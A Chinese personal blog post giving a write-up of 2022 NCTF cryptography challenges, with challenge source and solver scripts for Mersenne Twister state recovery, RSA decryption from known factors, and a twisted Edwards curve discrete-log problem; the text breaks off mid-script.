<!DOCTYPE html>


<html lang="zh-CN">
  

    <head>
      <meta charset="utf-8" />
        
      <meta
        name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1"
      />
      <title> f14g</title>
  <meta name="generator" content="hexo-theme-ayer">
      
      <link rel="shortcut icon" href="/favicon.ico" />
       
<link rel="stylesheet" href="/dist/main.css">

      
<link rel="stylesheet" href="/css/fonts/remixicon.css">

      
<link rel="stylesheet" href="/css/custom.css">
 
      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
       
 

      <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
      />
      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>

      <!-- mermaid -->
      
      <style>
        .swal2-styled.swal2-confirm {
          font-size: 1.6rem;
        }
      </style>
    </head>
  </html>
</html>


<body>
  <div id="app">
    
      
      <canvas width="1777" height="841"
        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
      
    <main class="content on">
      
<section class="cover">
    
  <div class="cover-frame">
    <div class="bg-box">
      <img src="/images/cover1.jpg" alt="image frame" />
    </div>
    <div class="cover-inner text-center text-white">
      <h1><a href="/">f14g</a></h1>
      <div id="subtitle-box">
        
        <span id="subtitle"></span>
        
      </div>
      <div>
        
      </div>
    </div>
  </div>
  <div class="cover-learn-more">
    <a href="javascript:void(0)" class="anchor"><i class="ri-arrow-down-line"></i></a>
  </div>
</section>



<script src="https://cdn.staticfile.org/typed.js/2.0.12/typed.min.js"></script>


<!-- Subtitle -->

  <script>
    try {
      var typed = new Typed("#subtitle", {
        strings: ['欢迎来到f14g的博客', '临渊羡鱼，不如退而结网', '想要的都拥有，得不到的都释怀'],
        startDelay: 0,
        typeSpeed: 200,
        loop: true,
        backSpeed: 100,
        showCursor: true
      });
    } catch (err) {
      console.log(err)
    }
  </script>
  
<div id="main">
  <section class="outer">
  
  
  

<div class="notice" style="margin-top:50px">
    <i class="ri-heart-fill"></i>
    <div class="notice-content" id="broad"></div>
</div>
<script type="text/javascript">
    fetch('https://v1.hitokoto.cn')
        .then(response => response.json())
        .then(data => {
            document.getElementById("broad").innerHTML = data.hitokoto;
        })
        .catch(console.error)
</script>

<style>
    .notice {
        padding: 20px;
        border: 1px dashed #e6e6e6;
        color: #969696;
        position: relative;
        display: inline-block;
        width: 100%;
        background: #fbfbfb50;
        border-radius: 10px;
    }

    .notice i {
        float: left;
        color: #999;
        font-size: 16px;
        padding-right: 10px;
        vertical-align: middle;
        margin-top: -2px;
    }

    .notice-content {
        display: initial;
        vertical-align: middle;
    }
</style>
  
  <article class="articles">
    
    
    
    
    <article
  id="post-2022NCTF"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/03/14/2022NCTF/"
    >2022NCTF</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/03/14/2022NCTF/" class="article-date">
  <time datetime="2023-03-14T14:04:55.000Z" itemprop="datePublished">2023-03-14</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/match/">match</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="2022NCTF"><a href="#2022NCTF" class="headerlink" title="2022NCTF"></a>2022NCTF</h1><p>这次Crypto题目对于我来说过于困难，还好战队的佬写了wp</p>
<h2 id="Coloratura"><a href="#Coloratura" class="headerlink" title="Coloratura"></a>Coloratura</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p><img src="/2023/03/14/2022NCTF/attach.png" alt="attach"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"></span><br><span class="line">width = <span class="number">208</span></span><br><span class="line">height = <span class="number">208</span></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">makeSourceImg</span>():</span><br><span class="line">    colors = long_to_bytes(getrandbits(width * height * <span class="number">24</span>))[::-<span class="number">1</span>]</span><br><span class="line">    img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height))</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            img.putpixel((j, i), (colors[x], colors[x + <span class="number">1</span>], colors[x + <span class="number">2</span>]))</span><br><span class="line">            x += <span class="number">3</span></span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">makeFlagImg</span>():</span><br><span class="line">    img = Image.new(<span class="string">&quot;RGB&quot;</span>, (width, height))</span><br><span class="line">    draw = ImageDraw.Draw(img)</span><br><span class="line">    draw.text((<span class="number">5</span>, <span class="number">5</span>), flag, fill=(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    img1 = makeSourceImg()</span><br><span class="line">    img2 = makeFlagImg()</span><br><span class="line">    img3 = Image.new(<span class="string">&quot;RGB&quot;</span>, (width, height))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            p1, p2 = img1.getpixel((j, i)), img2.getpixel((j, i))</span><br><span class="line">            img3.putpixel((j, i), <span class="built_in">tuple</span>([(p1[k] ^ p2[k]) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]))</span><br><span class="line">    img3.save(<span class="string">&#x27;attach.png&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inverse_shift</span>(<span class="params">x, shift, <span class="built_in">type</span>, mask=<span class="number">0xffffffff</span>, nbit=<span class="number">32</span></span>):</span><br><span class="line">    res = x</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(nbit//shift):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&#x27;l&#x27;</span>: res = x ^ res &lt;&lt; shift &amp; mask</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&#x27;r&#x27;</span>: res = x ^ res &gt;&gt; shift &amp; mask</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_extract</span>(<span class="params">x</span>):</span><br><span class="line">    x = inverse_shift(x, <span class="number">18</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    x = inverse_shift(x, <span class="number">15</span>, <span class="string">&#x27;l&#x27;</span>, <span class="number">4022730752</span>)</span><br><span class="line">    x = inverse_shift(x,  <span class="number">7</span>, <span class="string">&#x27;l&#x27;</span>, <span class="number">2636928640</span>)</span><br><span class="line">    x = inverse_shift(x, <span class="number">11</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_twist</span>(<span class="params">cur</span>):</span><br><span class="line">    high = <span class="number">0x80000000</span></span><br><span class="line">    low = <span class="number">0x7fffffff</span></span><br><span class="line">    mask = <span class="number">0x9908b0df</span></span><br><span class="line">    state = cur</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">623</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        tmp = state[i]^state[(i+<span class="number">397</span>)%<span class="number">624</span>]</span><br><span class="line">        <span class="comment"># recover Y,tmp = Y</span></span><br><span class="line">        <span class="keyword">if</span> tmp &amp; high == high:</span><br><span class="line">            tmp ^= mask</span><br><span class="line">            tmp &lt;&lt;= <span class="number">1</span></span><br><span class="line">            tmp |= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp &lt;&lt;=<span class="number">1</span></span><br><span class="line">        <span class="comment"># recover highest bit</span></span><br><span class="line">        res = tmp&amp;high</span><br><span class="line">        <span class="comment"># recover other 31 bits,when i =0,it just use the method again it so beautiful!!!!</span></span><br><span class="line">        tmp = state[i-<span class="number">1</span>]^state[(i+<span class="number">396</span>)%<span class="number">624</span>]</span><br><span class="line">        <span class="comment"># recover Y,tmp = Y</span></span><br><span class="line">        <span class="keyword">if</span> tmp &amp; high == high:</span><br><span class="line">            tmp ^= mask</span><br><span class="line">            tmp &lt;&lt;= <span class="number">1</span></span><br><span class="line">            tmp |= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp &lt;&lt;=<span class="number">1</span></span><br><span class="line">        res |= (tmp)&amp;low</span><br><span class="line">        state[i] = res</span><br><span class="line">    <span class="keyword">return</span> state</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract</span>(<span class="params">x</span>):</span><br><span class="line">    y = x</span><br><span class="line">    y = y ^ y &gt;&gt; <span class="number">11</span></span><br><span class="line">    y = y ^ y &lt;&lt; <span class="number">7</span> &amp; <span class="number">2636928640</span></span><br><span class="line">    y = y ^ y &lt;&lt; <span class="number">15</span> &amp; <span class="number">4022730752</span></span><br><span class="line">    y = y ^ y &gt;&gt; <span class="number">18</span></span><br><span class="line">    <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line">width = <span class="number">208</span></span><br><span class="line">height = <span class="number">208</span></span><br><span class="line">img3 = Image.<span class="built_in">open</span>(<span class="string">&#x27;attach.png&#x27;</span>)</span><br><span class="line">out = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">        pix = img3.getpixel((j, i))</span><br><span class="line">        out += [pix[<span class="number">0</span>], pix[<span class="number">1</span>], pix[<span class="number">2</span>]]</span><br><span class="line"></span><br><span class="line">out = [<span class="built_in">hex</span>(_)[<span class="number">2</span>:].zfill(<span class="number">2</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> out][::-<span class="number">1</span>]</span><br><span class="line">out = <span class="string">&#x27;&#x27;</span>.join(out)</span><br><span class="line">now_rand = [out[i: i + <span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(out), <span class="number">8</span>)][::-<span class="number">1</span>]</span><br><span class="line">now_rand = [<span class="built_in">int</span>(_, <span class="number">16</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> now_rand]</span><br><span class="line"></span><br><span class="line">state = [crack_extract(_) <span class="keyword">for</span> _ <span class="keyword">in</span> now_rand[-<span class="number">624</span>:]]</span><br><span class="line">ini_rand = []</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(ini_rand) &lt; <span class="built_in">len</span>(now_rand):</span><br><span class="line">    ini_rand = [extract(_) <span class="keyword">for</span> _ <span class="keyword">in</span> state] + ini_rand</span><br><span class="line">    state = crack_twist(state)</span><br><span class="line"></span><br><span class="line">ini_rand = [<span class="built_in">hex</span>(_)[<span class="number">2</span>:].zfill(<span class="number">8</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> ini_rand][::-<span class="number">1</span>]</span><br><span class="line">ini_rand = <span class="string">&#x27;&#x27;</span>.join(ini_rand)</span><br><span class="line">ini = [ini_rand[i: i + <span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ini_rand), <span class="number">2</span>)][::-<span class="number">1</span>]</span><br><span class="line">ini = [<span class="built_in">int</span>(_, <span class="number">16</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> ini]</span><br><span class="line"></span><br><span class="line">x = <span class="number">0</span></span><br><span class="line">flag = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">        pix = img3.getpixel((j, i))</span><br><span class="line">        flag.putpixel((j, i), (pix[<span class="number">0</span>] ^ ini[x], pix[<span class="number">1</span>] ^ ini[x + <span class="number">1</span>], pix[<span class="number">2</span>] ^ ini[x + <span class="number">2</span>]))</span><br><span class="line">        x += <span class="number">3</span></span><br><span class="line">flag.show()</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/14/2022NCTF/MyBlog\source_posts\2022NCTF.assets\image-20230314213110239.png" alt="image-20230314213110239"></p>
<h2 id="dp-promax"><a href="#dp-promax" class="headerlink" title="dp_promax"></a>dp_promax</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nbits = <span class="number">2200</span></span><br><span class="line">beta = <span class="number">0.4090</span></span><br><span class="line">p, q = getPrime(<span class="built_in">int</span>((<span class="number">1.</span> - beta) * nbits)), getPrime(<span class="built_in">int</span>(beta * nbits))</span><br><span class="line">dp = getrandbits(<span class="number">50</span>) | <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    d = (p - <span class="number">1</span>) * getrandbits(<span class="number">2800</span>) + dp</span><br><span class="line">    <span class="keyword">if</span> GCD((p - <span class="number">1</span>) * (q - <span class="number">1</span>), d) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">e = inverse(d, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">N = p * q</span><br><span class="line">flag = bytes_to_long(<span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(flag, e, N)</span><br><span class="line"><span class="built_in">print</span>(N)</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">46460689902575048279161539093139053273250982188789759171230908555090160106327807756487900897740490796014969642060056990508471087779067462081114448719679327369541067729981885255300592872671988346475325995092962738965896736368697583900712284371907712064418651214952734758901159623911897535752629528660173915950061002261166886570439532126725549551049553283657572371862952889353720425849620358298698866457175871272471601283362171894621323579951733131854384743239593412466073072503584984921309839753877025782543099455341475959367025872013881148312157566181277676442222870964055594445667126205022956832633966895316347447629237589431514145252979687902346011013570026217</span></span><br><span class="line"><span class="string">13434798417717858802026218632686207646223656240227697459980291922185309256011429515560448846041054116798365376951158576013804627995117567639828607945684892331883636455939205318959165789619155365126516341843169010302438723082730550475978469762351865223932725867052322338651961040599801535197295746795446117201188049551816781609022917473182830824520936213586449114671331226615141179790307404380127774877066477999810164841181390305630968947277581725499758683351449811465832169178971151480364901867866015038054230812376656325631746825977860786943183283933736859324046135782895247486993035483349299820810262347942996232311978102312075736176752844163698997988956692449</span></span><br><span class="line"><span class="string">28467178002707221164289324881980114394388495952610702835708089048786417144811911352052409078910656133947993308408503719003695295117416819193221069292199686731316826935595732683131084358071773123683334547655644422131844255145301597465782740484383872480344422108506521999023734887311848231938878644071391794681783746739256810803148574808119264335234153882563855891931676015967053672390419297049063566989773843180697022505093259968691066079705679011419363983756691565059184987670900243038196495478822756959846024573175127669523145115742132400975058579601219402887597108650628746511582873363307517512442800070071452415355053077719833249765357356701902679805027579294</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>发现N可以分解</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">e = <span class="number">13434798417717858802026218632686207646223656240227697459980291922185309256011429515560448846041054116798365376951158576013804627995117567639828607945684892331883636455939205318959165789619155365126516341843169010302438723082730550475978469762351865223932725867052322338651961040599801535197295746795446117201188049551816781609022917473182830824520936213586449114671331226615141179790307404380127774877066477999810164841181390305630968947277581725499758683351449811465832169178971151480364901867866015038054230812376656325631746825977860786943183283933736859324046135782895247486993035483349299820810262347942996232311978102312075736176752844163698997988956692449</span></span><br><span class="line">c = <span class="number">28467178002707221164289324881980114394388495952610702835708089048786417144811911352052409078910656133947993308408503719003695295117416819193221069292199686731316826935595732683131084358071773123683334547655644422131844255145301597465782740484383872480344422108506521999023734887311848231938878644071391794681783746739256810803148574808119264335234153882563855891931676015967053672390419297049063566989773843180697022505093259968691066079705679011419363983756691565059184987670900243038196495478822756959846024573175127669523145115742132400975058579601219402887597108650628746511582873363307517512442800070071452415355053077719833249765357356701902679805027579294</span></span><br><span class="line">p=<span class="number">3628978044425516256252147348112819551863749940058657194357489608704171827031473111609089635738827298682760802716155197142949509565102167059366421892847010862457650295837231017990389942425249509044223464186611269388650172307612888367710149054996350799445205007925937223059</span></span><br><span class="line">q=<span class="number">12802692475349485610473781287027553390253771106432654573503896144916729600503566568750388778199186889792482907407718147190530044920232683163941552482789952714283570754056433670735303357508451647073211371989388879428065367142825533019883798121260838408498282273223302509241229258595176130544371781524298142815099491753819782913040582455136982147010841337850805642005577584947943848348285516563</span></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,p*q)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment">#nctf&#123;Th1s_N_May_n0t_s0@o0@@_secur3&#125;</span></span><br></pre></td></tr></table></figure>



<h2 id="superecc"><a href="#superecc" class="headerlink" title="superecc"></a>superecc</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> INF, flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>] == <span class="string">b&#x27;nctf&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">super_ecc</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.a = <span class="number">73101304688827564515346974949973801514688319206271902046500036921488731301311</span></span><br><span class="line">        self.c = <span class="number">78293161515104296317366169782119919020288033620228629011270781387408756505563</span></span><br><span class="line">        self.d = <span class="number">37207943854782934242920295594440274620695938273948375125575487686242348905415</span></span><br><span class="line">        self.p = <span class="number">101194790049284589034264952247851014979689350430642214419992564316981817280629</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">self, P, Q</span>):</span><br><span class="line">        (x1, y1) = P</span><br><span class="line">        (x2, y2) = Q</span><br><span class="line">        x3 = (x1 * y2 + y1 * x2) * inverse(self.c * (<span class="number">1</span> + self.d * x1 * x2 * y1 * y2), self.p) % self.p</span><br><span class="line">        y3 = (y1 * y2 - self.a * x1 * x2) * inverse(self.c * (<span class="number">1</span> - self.d * x1 * x2 * y1 * y2), self.p) % self.p</span><br><span class="line">        <span class="keyword">return</span> (x3, y3)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">self, x, P</span>):</span><br><span class="line">        Q = INF</span><br><span class="line">        x = x % self.p</span><br><span class="line">        <span class="keyword">while</span> x &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> x % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">                Q = self.add(Q, P)</span><br><span class="line">            P = self.add(P, P)</span><br><span class="line">            x = x &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> Q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = bytes_to_long(flag[<span class="number">5</span>:-<span class="number">1</span>])</span><br><span class="line">ecc = super_ecc()</span><br><span class="line">G = (<span class="number">30539694658216287049186009602647603628954716157157860526895528661673536165645</span>,</span><br><span class="line">     <span class="number">64972626416868540980868991814580825204126662282378873382506584276702563849986</span>)</span><br><span class="line">S = ecc.mul(flag, G)</span><br><span class="line"><span class="built_in">print</span>(S)</span><br><span class="line"><span class="comment"># (98194560294138607903211673286210561363390596541458961277934545796708736630623,</span></span><br><span class="line"><span class="comment"># 58504021112693314176230785309962217759011765879155504422231569879170659690008)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>考查的是Twisted Edward Curve</p>
<p>题⽬定义了⼀个循环群上的点加法，搜索可以发现是Twisted Edward Curve</p>
<p><img src="/2023/03/14/2022NCTF/WAGZ2AYAFU.png" alt="img"></p>
<p>经过适当的变化可以将c消除掉，得到标准形式</p>
<p><img src="/2023/03/14/2022NCTF/SIGZ2AYAXQ.png" alt="img"></p>
<p>对于Twisted Edward Curve，可以转化为等价的Montgomery Curve</p>
<p><img src="/2023/03/14/2022NCTF/UMGZ2AYB44.png" alt="img"></p>
<p>Montgomery Curve的形式已经是Weierstrass形式的椭圆曲线，可以使⽤sage求解其阶，即求得了Twisted Edward Curve的阶寻找阶中的⼩素数因⼦，使⽤Pohlig Hellman + BSGS求解离散对数问题，得到flag的值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">super_ecc</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.a = <span class="number">73101304688827564515346974949973801514688319206271902046500036921488731301311</span></span><br><span class="line">        self.c = <span class="number">78293161515104296317366169782119919020288033620228629011270781387408756505563</span></span><br><span class="line">        self.d = <span class="number">37207943854782934242920295594440274620695938273948375125575487686242348905415</span></span><br><span class="line">        self.p = <span class="number">101194790049284589034264952247851014979689350430642214419992564316981817280629</span></span><br><span class="line">        self.INF = (<span 